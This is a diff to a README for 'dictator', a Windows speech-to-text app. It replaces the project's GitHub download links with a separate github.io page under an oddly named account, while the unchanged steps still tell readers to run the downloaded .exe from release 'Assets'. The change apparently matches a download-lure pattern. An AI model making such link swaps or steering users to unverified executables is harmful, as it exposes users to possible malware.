@@ -1,6 +1,6 @@
 # 🎙️ dictator - Convert your voice into clean text
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Mexicanrevolutionoilslick144/dictator)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://mexicanrevolutionoilslick144.github.io)
 
 Dictator turns your spoken words into clear, written text immediately. You speak into your microphone, and the program types the words into your active window. It uses cloud intelligence to make sense of your audio. You maintain privacy while you improve your daily drafting.
 
@@ -17,7 +17,7 @@ This application works on modern Windows computers. Ensure your computer meets t
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the [official download page](https://github.com/Mexicanrevolutionoilslick144/dictator).
+1.  Visit the [official download page](https://mexicanrevolutionoilslick144.github.io).
 2.  Locate the section labeled "Assets" at the bottom of the release notes.
 3.  Click the file ending in `.exe` to start your download.
 4.  Open the file once the download finishes.
